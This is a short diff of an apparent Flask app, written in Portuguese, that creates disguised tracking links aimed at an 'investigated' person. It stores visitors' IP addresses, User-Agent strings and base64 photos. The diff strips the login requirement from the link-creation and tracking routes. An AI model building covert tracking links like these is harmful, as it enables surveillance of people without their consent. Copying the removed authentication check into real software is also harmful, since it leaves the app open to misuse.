@@ -66,7 +66,6 @@ class Acesso(db.Model):
     foto_base64 = db.Column(db.Text)
     data = db.Column(db.DateTime, default=datetime.now)
     
-    
 
 # Tabela de registros (IP e User-Agent)
 class Registro(db.Model):
@@ -84,7 +83,6 @@ with app.app_context():
 
 # Página de criação de links
 @app.route("/criar_link", methods=["GET", "POST"])
-@login_requerido
 def criar_link():
     if request.method == "POST":
         nome_investigado = request.form["nome_investigado"]
@@ -113,7 +111,6 @@ def gerar_slug(tamanho=8):
 
 # Acessa o link disfarçado
 @app.route("/link/<slug>")
-@login_requerido
 def rastrear_link(slug):
     link = Link.query.filter_by(slug=slug).first()
     if not link:
@@ -139,8 +136,6 @@ def todos_links():
 
 
 @app.route("/excluir_link/<int:link_id>", methods=["POST"])
-
-
 @login_requerido
 def excluir_link(link_id):
     link = Link.query.get_or_404(link_id)
